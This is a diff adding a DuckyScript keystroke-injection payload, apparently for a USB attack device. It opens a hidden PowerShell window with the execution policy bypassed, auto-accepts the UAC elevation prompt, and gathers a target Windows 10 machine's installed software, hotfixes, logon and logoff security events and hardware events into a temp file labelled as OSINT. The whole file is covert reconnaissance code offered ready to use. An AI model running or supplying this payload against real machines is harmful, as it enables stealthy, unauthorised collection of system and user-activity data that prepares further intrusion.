@@ -1,0 +1,26 @@
+REM Title: Programs and Eventlogs to File
+REM Author: @beigeworm | https://github.com/beigeworm
+REM Description: Uses Powershell to gather a list of installed programs and Windows Eventlogs and saves the info to a file.
+REM Target: Windows 10
+
+REM some setup for dukie script.
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window).
+GUI r
+DELAY 750
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 5000
+
+REM the main powershell script.
+STRING $date = Get-Date -Format "yyyy-MM-dd-hh-mm-ss";$outputPath = "$env:temp\Osint-$date.txt";New-Item -ItemType File -Path $outputPath
+STRING ;$installed = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version, Vendor;$hotfixes = Get-WmiObject -Class Win32_QuickFixEngineering | Select-Object -Property HotFixID, Description, InstalledOn
+STRING ;$removed = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object {$_.DisplayName -ne $null}
+STRING ;$installed | Format-Table -AutoSize | Out-File -FilePath $outputPath ;$hotfixes | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append
+STRING ;$removed | Format-Table -AutoSize | Out-File -FilePath $outputPath -Append;$userActivity = Get-EventLog -LogName Security -EntryType SuccessAudit | Where-Object {$_.EventID -eq 4624 -or $_.EventID -eq 4634}
+STRING ;$userActivity | Out-File -FilePath $outputPath -Append;$hardwareInfo = Get-EventLog -LogName System | Where-Object {$_.EventID -eq 12 -or $_.EventID -eq 13};$hardwareInfo | Out-File -FilePath $outputPath -Append
+STRING ;sleep 30;exit
+ENTER
